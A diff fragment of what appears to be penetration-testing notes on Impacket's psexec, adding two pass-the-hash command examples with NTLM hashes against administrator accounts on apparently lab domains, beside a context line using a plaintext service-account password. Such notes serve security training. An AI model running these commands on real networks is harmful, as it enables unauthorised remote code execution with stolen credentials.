@@ -84,7 +84,11 @@ proxychains tools/impacket/examples/psexec.py INLANEFREIGHT.LOCAL/svc_sql:lucky7
 Passing a hash:
 
 ```bash
+# An example: 
 python3 psexec.py Administrator@$ip -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+
+# Another example:
+impacket-psexec egotistical-bank.local/administrator@$ip -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
 ```
 
 
